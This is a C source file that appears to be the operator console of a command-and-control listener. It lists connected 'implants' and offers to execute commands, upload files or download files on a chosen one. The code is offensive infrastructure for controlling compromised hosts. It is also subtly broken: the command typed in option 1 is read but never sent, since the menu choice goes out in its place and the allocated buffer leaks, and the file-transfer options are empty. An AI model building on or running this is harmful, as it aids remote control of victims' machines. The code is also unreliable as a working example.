/*
console.c

This function is responsible for handling user input. It will select an agent to interact with.
It will pass commands to the message handler and receive responses from the message handler

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <poll.h>

#include "queue.h"
#include "implant.h"
#include "base.h"
#include "console.h"
#include "message_handler.h"

// Global variables
extern implant_poll *poll_struct;
extern pthread_mutex_t poll_lock;
// Receive Queue
extern Queue* listener_receive_queue;
extern pthread_mutex_t listener_receive_queue_lock;
// Send Queue
extern Queue* listener_send_queue;
extern pthread_mutex_t listener_send_queue_lock;

int agent_console(int agent_fd){
	const char* menu = "Implant %d selected.\n"
				 "Provide an option.\n"
				 "1 - execute command\n"
				 "2 - put file\n"
				 "3 - get file\n"
				 "4 - go back\n\n";
	char buffer[BUFFERSIZE];
	char* buf;
	long option;
	printf(menu, agent_fd);
	printf(">");
				 
	while(fgets(buffer, BUFFERSIZE, stdin)){
		option = strtol(buffer, NULL, 10);
		switch(option){
	        case 1:	        	
	        	printf("Command > ");
	        	buf = malloc(BUFFERSIZE);
	        	memset(buf, 0, BUFFERSIZE);
	        	fgets(buf, BUFFERSIZE - 1, stdin);
	        	
	        	prepare_message(agent_fd, TYPE_COMMAND, buffer, strlen(buffer));
	        	break;
	        case 2:
	        	break;
	        case 3:
	        	break;
	        case 4:
	        	return 0;
	        default:
	        	printf("Unknown option selected\n");
	        	break;
	    }
	    printf(menu, agent_fd);
	    printf(">");
	}
	
	return 0;
}


void *console(void *vargp){
	int *fd_count = poll_struct->fd_count;
	struct pollfd *pfds = poll_struct->pfds;
	
	const char* menu = "\nWelcome to the implant listener.\n"
				 "Provide an option.\n"
				 "1 - list active agents\n"
				 "2 - select active agent\n"
				 "9 - exit\n\n";
	char buffer[BUFFERSIZE];
	long option;
				 
	printf("%s", menu);
	printf(">");
	
	while(fgets(buffer, BUFFERSIZE, stdin)){
		option = strtol(buffer, NULL, 10);
		switch(option){
			case 9:
				exit(0);
            case 1:
            	printf("Active Agents\n");
            	printf("-------------\n");
            	pthread_mutex_lock(&poll_lock);
            	for (int i = 0; i < *fd_count; i++){
					printf(" %d\n", pfds[i].fd);
				}
				pthread_mutex_unlock(&poll_lock);
            	break;
            case 2:
            	printf("Which agent?\n");
            	fgets(buffer, BUFFERSIZE, stdin);
            	option = strtol(buffer, NULL, 10);
            	agent_console(option);
            	break;
            default:
            	printf("Unknown option selected\n");
            	break;
        }
        
    	puts(menu);
    	printf(">");
	}
	return 0;
}